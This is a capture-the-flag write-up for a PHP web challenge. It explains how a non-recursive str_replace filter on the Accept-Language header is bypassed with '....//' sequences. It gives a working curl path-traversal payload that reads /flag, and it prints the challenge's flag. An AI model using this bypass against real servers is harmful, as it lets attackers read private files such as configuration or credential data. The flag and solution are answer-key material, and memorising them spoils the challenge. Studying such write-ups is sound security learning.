# Description
Welcome to fun with flags.

Flag is at /flag

## Solution
* we can see the php source code
* it uses `str_replace` to ""escape"" the header and prevent path traversal
* `str_replace` doesn't recursively replace the source string so it's easily bypassed
## Payload
```
curl 'http://localhost:1235/' -H 'Accept-Language: ....//....//....//....//flag'
```
* base64 encoded flag is then returned
## Flag
```
35c3_this_flag_is_the_be5t_fl4g
```
